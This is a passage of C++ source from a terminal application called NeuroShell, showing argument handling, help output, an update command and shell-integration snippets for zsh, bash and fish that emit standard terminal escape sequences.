            for (int i = 3; i < argc; ++i) {
                cmd += " ";
                cmd += argv[i];
            }
            EnterpriseTerminalHost host;
            if (cyberMode) host.SetCyberMode(true);
            host.ExecuteCommand(cmd, false);
            return 0;
        }
        if (arg1 == "update" || arg1 == "--update") {
            EnterpriseTerminalHost host;
            host.HandleSlashUpdate();
            return 0;
        }
        if (arg1 == "--help" || arg1 == "-h" || arg1 == "help") {
            std::cout << "⌬ NeuroShell v" << NEUROSHELL_VERSION << " — Tier-1 Enterprise Flagship AI Terminal\n\n";
            std::cout << "Usage: neuroshell [options] [command]\n\n";
            std::cout << "Options:\n";
            std::cout << "  --cyber           Launch directly in NeuroShell Cyber Edition\n";
            std::cout << "  init zsh          Output Zsh semantic shell integration\n";
            std::cout << "  init bash         Output Bash semantic shell integration\n";
            std::cout << "  init fish         Output Fish semantic shell integration\n";
            std::cout << "  update            Check and download latest in-place update\n";
            std::cout << "  --version, -v     Display release version and build info\n";
            std::cout << "  --help, -h        Display this help directory\n";
            return 0;
        }
        if (arg1 == "init" && argc >= 3) {
            std::string shell = argv[2];
            if (shell == "zsh") {
                std::cout << "# NeuroShell Zsh Semantic Integration\n"
                          << "if [[ -z \"$NEUROSHELL_SHELL_INTEGRATION_ACTIVE\" ]]; then\n"
                          << "  export NEUROSHELL_SHELL_INTEGRATION_ACTIVE=1\n"
                          << "  autoload -Uz add-zsh-hook\n"
                          << "  add-zsh-hook precmd () { printf \"\\033]133;D;%s\\007\\033]7;file://%s%s\\007\\033]133;A\\007\" \"$?\" \"$HOST\" \"$PWD\"; }\n"
                          << "  add-zsh-hook preexec () { printf \"\\033]133;C\\007\"; }\n"
                          << "fi\n";
                return 0;
            } else if (shell == "bash") {
                std::cout << "# NeuroShell Bash Semantic Integration\n"
                          << "if [[ -z \"$NEUROSHELL_SHELL_INTEGRATION_ACTIVE\" ]]; then\n"
                          << "  export NEUROSHELL_SHELL_INTEGRATION_ACTIVE=1\n"
                          << "  neuroshell_precmd() { printf \"\\033]133;D;%s\\007\\033]7;file://%s%s\\007\\033]133;A\\007\" \"$?\" \"$HOSTNAME\" \"$PWD\"; }\n"
                          << "  PROMPT_COMMAND=\"neuroshell_precmd; $PROMPT_COMMAND\"\n"
                          << "fi\n";
                return 0;
            } else if (shell == "fish") {
                std::cout << "# NeuroShell Fish Semantic Integration\n"
                          << "function __neuroshell_postexec --on-event fish_postexec\n"
                          << "  printf \"\\033]133;D;%s\\007\\033]7;file://%s%s\\007\" \"$status\" (hostname) \"$PWD\"\n"
                          << "end\n";
                return 0;
            }
        }
    }

    EnterpriseTerminalHost host;
    if (cyberMode) {
        host.SetCyberMode(true);
    }
    host.Run();
    return 0;
}
